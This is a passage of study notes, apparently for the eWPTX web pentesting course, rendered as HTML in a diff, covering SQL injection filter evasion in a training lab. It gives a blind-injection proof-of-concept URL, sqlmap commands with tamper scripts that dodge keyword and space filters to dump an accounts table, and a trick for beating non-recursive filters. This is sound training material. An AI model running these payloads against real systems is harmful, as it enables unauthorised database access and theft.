+	<span class="nt">--no-cast</span> <span class="nt">--threads</span><span class="o">=</span>5 <span class="nt">-v</span> 3 <span class="se">\</span>
+	<span class="nt">-D</span> selfie4you06 <span class="nt">-T</span> accounts <span class="se">\	</span>
+	<span class="nt">--columns</span> 
+</code></pre></div></div>
+
+<h3 id="7---boolean-based-blind">7 - Boolean-based blind</h3>
+<ul>
+  <li>UNION filtered out</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>symboliclogical filter (AND &gt; &amp;&amp; , OR &gt;</td>
+          <td> </td>
+          <td>)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>space to verical tab filter to bypass [space]OR filter</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Filters:
+/UNION/i
+/AND/i
+/ OR/i
+/6163636f756e7473/
+/selfie4you07.accounts/
+
+Query<span class="p">;</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT views FROM attachments where filename='</span><span class="nv">$entry</span><span class="s2">';"</span><span class="p">;</span>
+
+
+<span class="c"># PoC</span>
+TRUE:	http://hacker.site/2nd/upload.php?lab<span class="o">=</span>7&amp;payload<span class="o">=</span>01.jpg<span class="s1">'+%26%26+TRUE;%23
+
+
+# SQLMAP
+
+./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=7&amp;payload=x" \
+	-p payload --technique=B --dbms MySQL --suffix='</span><span class="p">;</span><span class="c">#' \</span>
+	<span class="nt">--tamper</span><span class="o">=</span><span class="s2">"symboliclogical, space2VT.py, accounts.py"</span> <span class="se">\</span>
+	<span class="nt">--no-cast</span> <span class="nt">--threads</span><span class="o">=</span>5 <span class="nt">-v</span> 3 <span class="se">\</span>
+	<span class="nt">--banner</span> <span class="nt">--flush-session</span> 
+	
+	
+./sqlmap.py <span class="nt">-u</span> <span class="s2">"http://hacker.site/2nd/upload.php?lab=7&amp;payload=x"</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--dbms</span> MySQL <span class="nt">--suffix</span><span class="o">=</span><span class="s1">';#'</span> <span class="se">\</span>
+	<span class="nt">--tamper</span><span class="o">=</span><span class="s2">"symboliclogical, space2VT.py, accounts.py"</span> <span class="se">\</span>
+	<span class="nt">--no-cast</span> <span class="nt">--threads</span><span class="o">=</span>5 <span class="nt">-v</span> 3 <span class="se">\</span>
+	<span class="nt">-D</span> selfie4you07 <span class="nt">-T</span> accounts <span class="se">\</span>
+	<span class="nt">--columns</span>
+	
+</code></pre></div></div>
+
+<h3 id="bonus-levels">BONUS LEVEL(s)</h3>
+
+<p>IN ALL LEVELS THE FILTER IS NOT RECOURSIVE</p>
+
+<ul>
+  <li>To exploit it you should upload first a filename with the payload you want to execute.</li>
+  <li>This will be excluded because contains filtered words</li>
+  <li>Then upload a new file with a name that bypass the redundant filter, such as <em>unUNIONnion</em>.</li>
+  <li>Once <strong>purified</strong> the latest filename will be the same as the fist uploaded and thus the file exitsts and can be displayed.</li>
+</ul>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#bypass" class="page__taxonomy-item" rel="tag">bypass</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-01T00:00:00+06:00">December 1, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=8+-+SQLI+Filter+Evasion%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fsqlievasion%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fsqlievasion%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fsqlievasion%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/sqli/" class="pagination--pager" title="7 - SQL Injection
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/xmlattacks/" class="pagination--pager" title="9 - XML Attacks
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
